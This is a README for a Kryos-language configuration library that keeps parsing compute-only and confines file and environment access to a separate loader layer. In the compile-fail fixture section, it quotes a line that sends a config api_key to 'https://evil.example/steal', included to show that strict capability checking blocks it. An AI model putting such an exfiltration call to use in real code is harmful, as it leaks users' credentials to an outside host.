# kryos-typed-config

A typed configuration loader with a **provable parse/effect split**. The layer
that parses and validates config is `@capabilities(compute)` — it physically
cannot read a file, the environment, or the network. Only a thin, separately
annotated loader reaches the outside world. And because a config's secret fields
are `kryos_secrets` `Secret` values, a parsed secret cannot reach a `net` sink
unless a function explicitly declared `net`.

TypeScript config loaders (zod + dotenv) are excellent at *shape* but
structurally weak at *authority*: the same module that validates config can also
read a file or hit the network in the same call. Kryos splits this so the
guarantee — **"config parsing has no side effects, and secrets can't leak during
load"** — is a compile-time property, checked by `kryos manifest --caps` and
`kryos check --strict-capabilities`.

## The idea

```
  raw text ──▶ parse_config ──▶ validate ──▶ AppConfig | [errors]
              (src/typed.kry, COMPUTE-ONLY)

  file / env ──▶ load_file / load_env_var ──▶ (hands raw text to parse_config)
                (src/loader.kry, the ONLY io/process surface)
```

- `src/typed.kry` turns config **text** into a typed `AppConfig` (or the full
  list of validation errors). Every function is `@capabilities(compute)`. It
  receives text; it never goes and *gets* text. `kryos manifest --caps --deny
  io,process,net,...` over this file is the machine-checkable proof.
- `src/loader.kry` is the effect layer. `load_file` declares `io` (it calls
  `file_read`); `load_env_var` declares `process` (it calls `env_get`). The
  authority to touch the outside world is confined here and nowhere else.

It reuses the merged ecosystem rather than reinventing:

- **kryos-schema** — the `Schema` combinators (`str_`, `int_`, `object`,
  `with_min`, `enum_of`, ...) and the all-errors `validate`.
- **kryos-secrets** — the opaque `Secret` handle for the `api_key` field.
- **std::json** — `parse(text) -> JsonValue` and the pure accessors. `parse`
  performs no I/O (it only scans the string), so it does not widen capabilities.

## API

Parse / validate surface — `src/typed.kry` (`use typed`):

| Function | Capability | Purpose |
| --- | --- | --- |
| `parse_config(raw: str) -> Result<AppConfig, [str]>` | compute | Parse + validate config TEXT. `Ok(cfg)` or `Err([all violations])`. |
| `app_schema() -> Schema` | compute | The schema `AppConfig` must satisfy, built from kryos-schema combinators. |

Effect layer — `src/loader.kry` (`use loader`):

| Function | Capability | Purpose |
| --- | --- | --- |
| `load_file(path: str) -> Result<AppConfig, [str]>` | **io** + compute | Read a config file, then `parse_config` it. |
| `load_env_var(key: str) -> Result<AppConfig, [str]>` | **process** + compute | Read config text from an env var, then `parse_config` it. |

The `compute` on the loaders is the propagated capability of the `parse_config`
they call — Kryos's checker is non-transitive, so a caller declares the union of
what it calls. The point of the table is the *io* / *process*: those tokens
appear **only** on the loaders, never on the parse/validate surface.

## The typed config

```kryos
struct AppConfig {
    host: str,
    port: i64,
    log_level: str,
    max_connections: i64,
    debug: bool,
    api_key: Secret,   // a kryos_secrets Secret -- redacts in logs, gated on exit
}
```

The schema (`app_schema()`): `host` non-empty; `port` 1..65535; `log_level` one
of `debug|info|warn|error`; `max_connections` 1..10000; `debug` a bool; `api_key`
a non-empty string, wrapped into a `Secret` on extraction.

## Run it

```
kryos run ecosystem/kryos-typed-config/demo_typed.kry
```

```
== 1. load_file (io) -> typed AppConfig ==
host            = db.internal
port            = 5432
log_level       = warn
max_connections = 200
api_key         = Secret(api_key, 16 bytes)
api_key prefix  = sk-live...

== 2. malformed config -> ALL violations at once ==
6 violations:
  - host: string length 0 is below minimum 1
  - port: value 70000 exceeds maximum 65535
  - log_level: value "verbose" is not one of [debug, info, warn, error]
  - max_connections: value 0 is below minimum 1
  - debug: expected bool, got string
  - api_key: string length 0 is below minimum 1

== 3. malformed JSON -> single syntax error ==
config: invalid JSON: json: expected '"' but got 'n' at position 1
```

The raw `api_key` value never appears in the output — only its redaction and a
prefix obtained through the capability-scoped `expose`.

## The capability proof (the headline)

```
KRYOS=/path/to/kryos ./ecosystem/kryos-typed-config/check_caps.sh
```

```
== capability manifest: src/typed.kry (parse + validate surface) ==
fn _extract: [compute]
fn app_schema: [compute]
fn parse_config: [compute]
unannotated: 0

== deny net,io,ffi,crypto,process,env,term,db,time on src/typed.kry ==
PASS: the parse/validate surface is compute-only (no I/O capabilities).

== capability manifest: src/loader.kry (the effect layer) ==
fn load_env_var: [compute, process]
fn load_file: [compute, io]
unannotated: 0
```

The deny gate is the guarantee: nothing on the parse/validate path can perform
I/O. The effects are confined to `loader.kry`, where they are visible on the
function signatures.

## Compile-fail fixture (the negative half)

`tests/fixtures/leak_config.kry` is a config-processing function that takes a
typed `AppConfig` and tries to ship its `api_key` to `http2_post`. It is
**supposed to fail** strict checking:

```
kryos check --strict-capabilities ecosystem/kryos-typed-config/tests/fixtures/leak_config.kry
```

```
error[E0505]: builtin `http2_post` requires `net` capability
 --> ecosystem/kryos-typed-config/tests/fixtures/leak_config.kry:40:42
   40 |     return expose_int(cfg.api_key, |raw| http2_post("https://evil.example/steal", raw))
      |                                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ requires `net`
   = note: add `@capabilities(net)` to the enclosing function or actor
error: check failed: 1 error, 0 warnings
```

Without `--strict-capabilities` the same file checks clean (exit 0), so
`kryos test` (which compiles it in non-strict mode) stays green. Flip strict on,
and an undeclared "config secret -> network" path becomes a build error. A
compiler rejection cannot be asserted from inside a running `@test`, so this is
verified at the CLI and the output is pasted into the PR evidence.

## Tests

```
kryos test --path ecosystem/kryos-typed-config
```

Six `@test` functions in `tests/test_typed.kry` cover: a valid config parsing
into the typed struct (with the `api_key` Secret redacting safely and `expose`
returning the raw value); a malformed config collecting **all six** violations
at once; all missing required fields reported; malformed JSON and a non-object
top level each returning a single clear error; and wrong field types being
reported rather than panicking.

## MVP scope

In scope (built here):

- A typed `AppConfig` + a hand-written `app_schema()` over a `std::json` value.
- `parse_config`: compute-only parse + validate, returning the typed struct or
  every error at once.
- A separate `io`/`process` loader (`load_file`, `load_env_var`) that feeds raw
  text in.
- `api_key` as a kryos-secrets `Secret`; a compile-fail fixture proving a
  compute validator can't pass it to a `net` sink under strict mode.
- A runnable demo and the `check_caps.sh` manifest proof.

Out of scope (per the project spec): schema-to-type codegen (no comptime/macros
— schema and struct are written by hand), layered merge precedence, live reload,
remote config.

## Notes and honest limitations

- **No zod-style inference.** The developer writes the `AppConfig` struct *and*
  `app_schema()` separately and keeps them in agreement; a mismatch is not
  caught for you. This library lands the **authority** story (provable
  parse/effect split, no secret leak), not the typing-ergonomics story. That is
  the deliberate trade the spec calls out.
- **`Secret` is specialized to a `str` payload**, not a generic `Secret<T>`.
  Generic-struct method ergonomics are limited in the current toolchain, and the
  spec anticipated this; `str` is the dominant secret shape.
- **`std::json` import is an explicit symbol list, not `use std::json::*`.** The
  glob pulls the whole json module (including the float-formatting `stringify`
  path) into the compilation, and that path cannot be JIT-compiled by
  `kryos test`. The explicit list is the union of what `typed.kry` uses and what
  the transitively-loaded `kryos_schema::validate` needs, so the cross-package
  validator resolves while the float path stays out of the test JIT.
- **Release (LLVM/AOT) builds are not part of the done-criteria here.** The
  evidence above is from `kryos run` / `kryos test` (the Cranelift JIT).
  Constructing and *stringifying* `std::json` values under AOT has known issues
  in this toolchain; this library only *parses* and *reads* JSON, but if you
  build a release binary, exercise it before relying on it.
- The enforcement is a **dataflow capability** property, not encryption. The raw
  secret bytes live in memory in the clear; what the compiler guarantees is that
  they cannot reach a `net`/`io` sink from a scope that didn't declare it.

## License

Apache-2.0. See `LICENSE`.
